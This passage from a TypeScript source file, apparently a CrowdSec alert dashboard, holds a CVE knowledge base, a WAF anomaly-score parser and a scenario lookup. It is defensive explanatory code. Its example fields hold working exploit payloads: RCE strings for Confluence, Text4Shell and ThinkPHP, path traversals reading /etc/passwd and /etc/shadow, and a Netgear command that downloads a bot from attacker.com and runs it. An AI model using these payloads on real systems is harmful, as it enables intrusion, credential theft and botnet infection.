    impact: 'Unauthenticated full server RCE, complete Confluence compromise.',
    examples: [
      'GET /${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd",#a))}/',
    ],
    mitigation: [
      'Update to Confluence 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1+',
      'Immediately restrict internet access to Confluence if patching is delayed',
    ],
    references: ['https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html'],
  },

  'cve_2022_35914': {
    title: 'GLPI — Remote Code Execution',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-35914',
    description:
      'RCE vulnerability in GLPI IT service management software (< 10.0.2). The htmlawed library used by GLPI can be abused to execute PHP code through crafted input to the /vendor/htmlawed/htmlawed/htmLawed.php endpoint.',
    impact: 'Unauthenticated RCE on GLPI server, ITSM data breach.',
    examples: [
      'POST /vendor/htmlawed/htmlawed/htmLawed.php  body: sid=aa&hhook=exec&text=id',
    ],
    mitigation: [
      'Update GLPI to version 10.0.2 or later',
      'Restrict access to /vendor/ directory in web server config',
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-35914'],
  },

  'cve_2022_40684': {
    title: 'FortiOS / FortiProxy — Authentication Bypass',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-40684',
    description:
      'Critical authentication bypass in Fortinet FortiOS, FortiProxy, and FortiSwitchManager management interfaces. Allows unauthenticated attackers to perform privileged operations via crafted HTTP/HTTPS requests.',
    impact: 'Full firewall/VPN management compromise, network infrastructure takeover.',
    examples: [
      'PUT /api/v2/cmdb/system/admin/admin  (with crafted Forwarded header)',
    ],
    mitigation: [
      'Update FortiOS to 7.0.7+, 7.2.2+, or apply Fortinet advisory patches',
      'Disable management interface access from internet',
      'Restrict management to trusted IPs only',
    ],
    references: ['https://www.fortiguard.com/psirt/FG-IR-22-377'],
  },

  'cve_2022_41697': {
    title: 'Zimbra — Enumeration Vulnerability',
    severity: 'medium',
    category: 'CVE',
    cve: 'CVE-2022-41697',
    description:
      'User enumeration vulnerability in Zimbra Collaboration Suite. Allows unauthenticated attackers to determine valid email account usernames through different server responses for valid vs. invalid accounts.',
    impact: 'Account enumeration facilitating targeted brute force or phishing attacks.',
    examples: [
      'POST /service/soap  (different response for valid/invalid accounts)',
    ],
    mitigation: [
      'Update Zimbra to the latest patched version',
      'Implement consistent response times for auth failures (constant-time comparison)',
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-41697'],
  },

  'cve_2022_42889': {
    title: 'Text4Shell — Apache Commons Text RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-42889',
    description:
      'RCE vulnerability in Apache Commons Text library (similar to Log4Shell). The StringSubstitutor class performs interpolation that includes script, dns, and url lookups, allowing code execution through crafted input.',
    impact: 'RCE in any Java application using Apache Commons Text < 1.10.0.',
    examples: [
      '${script:javascript:java.lang.Runtime.getRuntime().exec(\'touch /tmp/pwned\')}',
      '${dns:attacker.com}  (DNS callback for detection)',
    ],
    mitigation: [
      'Update Apache Commons Text to 1.10.0+',
      'Audit all Java dependencies for commons-text usage',
      'Block interpolation patterns at WAF level',
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-42889'],
  },

  'spring4shell_cve_2022_22965': {
    title: 'Spring4Shell — Spring Framework RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-22965',
    description:
      'Critical RCE in Spring Framework (Spring4Shell). When running on JDK 9+ with Spring deployed as WAR on Tomcat, attackers can abuse Spring\'s data binding to set Tomcat\'s class loader properties, writing a JSP webshell to disk.',
    impact: 'Unauthenticated RCE on Spring MVC/WebFlux applications on Tomcat.',
    examples: [
      'POST /  body: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di',
    ],
    mitigation: [
      'Update Spring Framework to 5.3.18+ or 5.2.20+',
      'Update Spring Boot to 2.6.6+ or 2.5.12+',
      'Apply Tomcat patch (10.0.20+, 9.0.62+, 8.5.78+)',
    ],
    references: ['https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement'],
  },

  'f5_big_ip_cve_2020_5902': {
    title: 'F5 BIG-IP TMUI — RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2020-5902',
    description:
      'Critical RCE vulnerability in F5 BIG-IP Traffic Management User Interface (TMUI). A path traversal flaw allows unauthenticated remote code execution on F5 BIG-IP appliances (CVSS 10.0). Massively exploited within hours of disclosure.',
    impact: 'Full BIG-IP appliance compromise, load balancer/ADC takeover, network infrastructure breach.',
    examples: [
      'GET /tmui/login.jsp/..;/tmui/util/getTabSet.jsp  (path traversal)',
      'POST /mgmt/tm/util/bash  body: {"command":"run","utilCmdArgs":"-c id"}',
    ],
    mitigation: [
      'Update BIG-IP to patched versions immediately',
      'Restrict TMUI access to trusted management networks only',
      'Consider disabling TMUI if not needed',
    ],
    references: ['https://support.f5.com/csp/article/K52145254'],
  },

  'fortinet_cve_2018_13379': {
    title: 'FortiOS SSL VPN — Path Traversal',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2018-13379',
    description:
      'Path traversal vulnerability in FortiOS SSL VPN web portal allows unauthenticated attackers to download system files including the session file, which contains usernames and plaintext passwords.',
    impact: 'VPN credential theft, network access.',
    examples: [
      'GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession',
    ],
    mitigation: [
      'Update FortiOS to 5.4.13+, 5.6.11+, 6.0.8+, 6.2.0+',
      'Reset all VPN user credentials after patching',
    ],
    references: ['https://www.fortiguard.com/psirt/FG-IR-18-384'],
  },

  'pulse_secure_sslvpn_cve_2019_11510': {
    title: 'Pulse Secure VPN — Arbitrary File Read',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2019-11510',
    description:
      'Unauthenticated arbitrary file read in Pulse Secure SSL VPN. Attackers can read sensitive files including VPN credentials and session tokens, enabling unauthorized network access.',
    impact: 'VPN credential theft, session hijacking, internal network access.',
    examples: [
      'GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd',
      'GET /dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb',
    ],
    mitigation: [
      'Update Pulse Connect Secure to 8.1R15.1, 8.2R12.1, 8.3R7.1, 9.0R3.4+',
      'Reset all user credentials and active sessions after patching',
    ],
    references: ['https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101'],
  },

  'vmware_cve_2022_22954': {
    title: 'VMware Workspace ONE — SSTI RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-22954',
    description:
      'Server-Side Template Injection (SSTI) vulnerability in VMware Workspace ONE Access and Identity Manager. Allows unauthenticated RCE via the catalog-portal service without authentication.',
    impact: 'Unauthenticated RCE, VMware Identity Manager compromise.',
    examples: [
      'GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=  (SSTI payload in deviceUdid)',
    ],
    mitigation: [
      'Apply VMware VMSA-2022-0011 patches immediately',
      'Restrict access to Workspace ONE from the internet',
    ],
    references: ['https://www.vmware.com/security/advisories/VMSA-2022-0011.html'],
  },

  'vmware_vcenter_vmsa_2021_0027': {
    title: 'VMware vCenter — Multiple Critical CVEs',
    severity: 'critical',
    category: 'CVE',
    cve: 'VMSA-2021-0027',
    description:
      'Advisory covering multiple critical vulnerabilities in VMware vCenter Server including CVE-2021-22005 (arbitrary file upload leading to RCE) and others. CVE-2021-22005 was massively exploited within hours of disclosure.',
    impact: 'Unauthenticated RCE on vCenter, full VMware infrastructure compromise.',
    examples: [
      'POST /analytics/ceip/api/uploadVcsaData  (CVE-2021-22005 file upload)',
    ],
    mitigation: [
      'Apply VMSA-2021-0027 patches immediately',
      'Restrict vCenter access to management networks only',
      'Never expose vCenter management interface to the internet',
    ],
    references: ['https://www.vmware.com/security/advisories/VMSA-2021-0027.html'],
  },

  'http_cve_2021_41773': {
    title: 'Apache httpd — Path Traversal (41773)',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2021-41773',
    description:
      'Path traversal and RCE vulnerability in Apache HTTP Server 2.4.49. A flaw in path normalization allows attackers to map URLs outside the document root. If mod_cgi is enabled, this leads to remote code execution.',
    impact: 'Unauthenticated path traversal, potential RCE if mod_cgi is enabled.',
    examples: [
      'GET /cgi-bin/.%2E/.%2E/.%2E/.%2E/etc/passwd',
      'POST /cgi-bin/.%2E/.%2E/.%2E/.%2E/bin/sh  body: echo Content-Type: text/plain; echo; id',
    ],
    mitigation: [
      'Update Apache httpd to 2.4.50 immediately (then also patch 2.4.50 for CVE-2021-42013)',
      'Ensure "Require all denied" is set for directories',
    ],
    references: ['https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2021-41773'],
  },

  'http_cve_2021_42013': {
    title: 'Apache httpd — Path Traversal (42013)',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2021-42013',
    description:
      'Follow-up to CVE-2021-41773. The fix in Apache 2.4.50 was incomplete, allowing the traversal with further encoding. Affects Apache 2.4.49 and 2.4.50 with mod_cgi enabled.',
    impact: 'Unauthenticated path traversal and RCE.',
    examples: [
      'GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
      'GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/shadow',
    ],
    mitigation: [
      'Update Apache httpd to 2.4.51 or later immediately',
      'Disable mod_cgi if not required',
    ],
    references: ['https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2021-42013'],
  },

  'jira_cve_2021_26086': {
    title: 'Jira — Path Traversal',
    severity: 'medium',
    category: 'CVE',
    cve: 'CVE-2021-26086',
    description:
      'Path traversal vulnerability in Atlassian Jira Server and Data Center. Allows remote unauthenticated attackers to read particular files within Jira\'s installation directory via the /WEB-INF/ path traversal.',
    impact: 'Disclosure of Jira configuration files and internal resources.',
    examples: [
      'GET /s/thisisprotected/..;/WEB-INF/web.xml',
    ],
    mitigation: [
      'Update Jira to 8.13.7+, 8.14.0+, or 8.5.12+',
      'Block access to WEB-INF at reverse proxy level',
    ],
    references: ['https://jira.atlassian.com/browse/JRASERVER-72695'],
  },

  'netgear_rce': {
    title: 'Netgear Router — Unauthenticated RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'DGN1000/DGN2200',
    description:
      'Unauthenticated remote code execution vulnerabilities in Netgear DGN1000 and DGN2200 routers. The setup.cgi endpoint accepts OS commands without authentication due to improper input sanitization.',
    impact: 'Full router compromise, network interception, botnet recruitment (Mirai variants).',
    examples: [
      'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://attacker.com/bot.sh+-O+/tmp/bot.sh;sh+/tmp/bot.sh',
    ],
    mitigation: [
      'Replace end-of-life Netgear devices or apply firmware patches',
      'Never expose router admin interfaces to the internet',
      'Change default admin credentials',
    ],
    references: ['https://www.exploit-db.com/exploits/25978'],
  },

  'thinkphp_cve_2018_20062': {
    title: 'ThinkPHP — Remote Code Execution',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2018-20062',
    description:
      'RCE vulnerability in ThinkPHP 5.x framework. The framework does not properly validate controller names from URL routing, allowing attackers to invoke arbitrary methods and execute OS commands.',
    impact: 'Unauthenticated full server RCE, widely exploited by botnets.',
    examples: [
      'GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
      'GET /?s=index/think\\Request/input&filter=system&data=id',
    ],
    mitigation: [
      'Update ThinkPHP to the latest stable version',
      'Implement strict input validation on controller parameters',
      'Use a WAF to block common ThinkPHP exploit patterns',
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-20062'],
  },

  'ssh_cve_2024_6387': {
    title: 'regreSSHion — OpenSSH Signal Handler RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2024-6387',
    description:
      'Critical unauthenticated RCE vulnerability in OpenSSH server (sshd) on glibc-based Linux systems. A signal handler race condition in SIGALRM allows remote code execution as root. Affects OpenSSH < 4.4p1 and 8.5p1–9.7p1.',
    impact: 'Unauthenticated root code execution on vulnerable SSH servers.',
    examples: [
      'Timing-based attack exploiting SIGALRM race condition during SSH authentication',
      'Exploitation requires multiple connection attempts over extended time',
    ],
    mitigation: [
      'Update OpenSSH to 9.8p1 immediately',
      'Set LoginGraceTime=0 as temporary mitigation (increases DoS risk)',
      'Restrict SSH access by IP allowlist',
    ],
    references: ['https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt'],
  },
}

/**
 * Returns attack info for a given scenario name, doing fuzzy matching
 * against known keys.
 */
// ── WAF anomaly score parser ────────────────────────────────────────────────

const WAF_TYPE_LABELS: Record<string, string> = {
  xss: 'XSS',
  sql_injection: 'SQL Injection',
  lfi: 'LFI / Path Traversal',
  rce: 'Remote Code Execution',
  php_injection: 'PHP Injection',
  http_violation: 'HTTP Protocol Violation',
  anomaly: 'Anomaly',
}

const WAF_TYPE_DESCRIPTIONS: Record<string, string> = {
  xss: 'Cross-Site Scripting (XSS)',
  sql_injection: 'SQL Injection',
  lfi: 'Local File Inclusion / Path Traversal',
  rce: 'Remote Code Execution',
  php_injection: 'PHP Code Injection',
  http_violation: 'HTTP Protocol Violation',
}

const WAF_IMPACTS: Record<string, string> = {
  xss: 'Session hijacking, credential theft, malicious script execution in victim browsers.',
  sql_injection: 'Unauthorized data access, authentication bypass, potential data exfiltration.',
  lfi: 'Unauthorized access to sensitive files (config, passwords, source code).',
  rce: 'Full server compromise, arbitrary code execution as the web server user.',
  php_injection: 'Arbitrary PHP code execution, full server compromise.',
  http_violation: 'Request smuggling, WAF bypass, cache poisoning.',
}

/**
 * Parse a CrowdSec AppSec WAF anomaly score scenario string like:
 * "anomaly score block: xss: 30, rce: 5, anomaly: 35,"
 * and return a synthetic AttackInfo.
 */
export function parseWafAnomalyInfo(scenario: string): AttackInfo | null {
  const lower = scenario.toLowerCase()
  if (!lower.includes('anomaly score') && !lower.includes('anomaly score block')) return null

  // Parse all type: score pairs
  const scores: Record<string, number> = {}
  const re = /([a-z_]+):\s*(\d+)/g
  let m: RegExpExecArray | null
  while ((m = re.exec(lower)) !== null) {
    if (m[1] !== 'anomaly') scores[m[1]] = (scores[m[1]] ?? 0) + parseInt(m[2])
  }

  // Also get total anomaly score
  const anomalyMatch = /anomaly:\s*(\d+)/g
  let totalAnomaly = 0
  let am: RegExpExecArray | null
  while ((am = anomalyMatch.exec(lower)) !== null) totalAnomaly = Math.max(totalAnomaly, parseInt(am[1]))

  const attackTypes = Object.entries(scores).sort((a, b) => b[1] - a[1])

  if (attackTypes.length === 0 && totalAnomaly === 0) return null

  // Severity based on total anomaly score
  const severity: AttackInfo['severity'] =
    totalAnomaly >= 80 ? 'critical'
    : totalAnomaly >= 40 ? 'high'
    : totalAnomaly >= 20 ? 'medium'
    : 'low'

  const typeLabels = attackTypes.map(([t]) => WAF_TYPE_LABELS[t] ?? t)
  const title =
    typeLabels.length === 0
      ? 'WAF Anomaly Block'
      : typeLabels.length === 1
        ? `WAF Block — ${typeLabels[0]}`
        : `WAF Block — ${typeLabels.slice(0, 3).join(' + ')}`

  const dominantType = attackTypes[0]?.[0]
  const dominantDesc = dominantType ? WAF_TYPE_DESCRIPTIONS[dominantType] : null
  const scoresList = attackTypes
    .map(([t, s]) => `${WAF_TYPE_LABELS[t] ?? t} (score: ${s})`)
    .join(', ')

  const description =
    `CrowdSec AppSec WAF blocked this request using anomaly scoring (total: ${totalAnomaly}). ` +
    (dominantDesc
      ? `Primary threat: ${dominantDesc}. `
      : '') +
    (scoresList
      ? `Detected attack categories: ${scoresList}.`
      : 'Request exceeded the anomaly threshold without a specific category.')

  const impact =
    attackTypes.map(([t]) => WAF_IMPACTS[t]).filter(Boolean)[0]
    ?? 'Potential web application attack — request was blocked by the WAF.'

  const examples = attackTypes.flatMap(([t]) => {
    const infoKey = t === 'lfi' ? 'http_path_traversal_probing'
      : t === 'sql_injection' ? 'http_sqli_probing'
      : t === 'xss' ? 'http_xss_probing'
      : null
    return infoKey ? (KNOWLEDGE[infoKey]?.examples ?? []) : []
  }).slice(0, 3)

  return {
    title,
    severity,
    category: 'WAF / AppSec',
    description,
    impact,
    examples,
    mitigation: [
      'Review the full request context in access logs',
      'Check if the source IP is a known scanner or malicious actor',
      'Tune AppSec thresholds if legitimate traffic is being blocked',
      'Consider adding source IPs to CrowdSec allowlist if false positive',
    ],
  }
}

export function getAttackInfo(scenario: string): AttackInfo | null {
  // Handle WAF anomaly score strings first (these come from AppSec WAF)
  const wafInfo = parseWafAnomalyInfo(scenario)
  if (wafInfo) return wafInfo

  // Normalize: remove prefix, replace separators
  const normalized = scenario
    .toLowerCase()
    .replace(/^crowdsecurity\//g, '')
    .replace(/^ltsich\//g, '')
    .replace(/[-/]/g, '_')

  // Direct key match
  if (KNOWLEDGE[normalized]) return KNOWLEDGE[normalized]

  // Common alias mappings
  const aliases: Record<string, string> = {
    'http_crawl_non_statics': 'http_crawl_non_statics',
    'apache_log4j2_cve_2021_44228': 'apache_log4j2_cve_2021_44228',
    'lfi': 'http_path_traversal_probing',
    'sqli': 'http_sqli_probing',
    'xss': 'http_xss_probing',
    'brute_force': 'http_generic_bf',
    'anomaly': 'anomaly_score',
    'w00tw00t': 'http_w00tw00t',
  }
  if (aliases[normalized]) return KNOWLEDGE[aliases[normalized]] ?? null

  // Fuzzy: check if any key appears in the scenario string
  for (const [key, info] of Object.entries(KNOWLEDGE)) {
    if (normalized.includes(key) || key.includes(normalized)) return info
  }

  // Partial CVE match (e.g. "cve_2022_41082" in normalized)
  const cveMatch = normalized.match(/cve[_-](\d{4})[_-](\d+)/)
  if (cveMatch) {
    const cveKey = `cve_${cveMatch[1]}_${cveMatch[2]}`
    if (KNOWLEDGE[cveKey]) return KNOWLEDGE[cveKey]
  }

  return null
}

export const SEVERITY_CLASSES: Record<AttackInfo['severity'], { badge: string; border: string; icon: string }> = {
  critical: {
    badge: 'bg-red-500/15 text-red-700 dark:text-red-400 border border-red-500/30',
    border: 'border-red-500/30',
    icon: 'text-red-500',
  },
  high: {
    badge: 'bg-orange-500/15 text-orange-700 dark:text-orange-400 border border-orange-500/30',
    border: 'border-orange-500/30',
    icon: 'text-orange-500',
  },
  medium: {
    badge: 'bg-amber-500/15 text-amber-700 dark:text-amber-400 border border-amber-500/30',
    border: 'border-amber-500/30',
    icon: 'text-amber-500',
  },
  low: {
    badge: 'bg-blue-500/15 text-blue-700 dark:text-blue-400 border border-blue-500/30',
    border: 'border-blue-500/30',
    icon: 'text-blue-500',
  },
  info: {
    badge: 'bg-slate-500/15 text-slate-700 dark:text-slate-400 border border-slate-500/30',
    border: 'border-slate-500/30',
    icon: 'text-slate-500',
  },
}

export const CATEGORY_ICON_CLASS: Record<string, string> = {
  'Injection': 'text-red-500',
  'CVE': 'text-orange-500',
  'WAF / AppSec': 'text-violet-500',
  'Reconnaissance': 'text-blue-500',
  'Authentication': 'text-amber-500',
  'Denial of Service': 'text-red-600',
  'File Access': 'text-orange-400',
  'Bot / Scanner': 'text-slate-400',
  'CMS Exploitation': 'text-pink-500',
  'Malware / Backdoor': 'text-red-700',
  'Vulnerability Exploitation': 'text-orange-600',
  'Code Execution': 'text-red-600',
}
